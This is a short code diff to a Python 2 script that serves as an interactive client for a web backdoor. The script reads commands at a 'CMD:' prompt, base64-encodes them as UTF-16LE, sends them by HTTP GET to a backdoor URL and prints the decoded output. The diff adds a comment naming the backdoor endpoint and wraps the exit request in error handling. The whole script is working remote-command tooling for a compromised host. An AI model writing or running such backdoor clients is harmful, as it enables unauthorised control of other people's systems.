@@ -1,4 +1,5 @@
 #!/usr/env/python
+#hxxp://127.0.0.1:9999/backdoor/?cmd=
 import requests
 from base64 import b64encode, b64decode
 import urllib
@@ -8,7 +9,10 @@ def main():
 	while True:
 		cmd = raw_input('CMD: ').strip()
 		if cmd.upper() == 'exit':
-			requests.get(url + 'exit')
+			try:
+				requests.get(url + 'exit')
+			except:
+				pass
 			return
 		else:
 			print(b64decode(requests.get(url + urllib.quote( b64encode(cmd.encode('UTF-16LE')), safe='' ) ).text).replace('\x00',''))
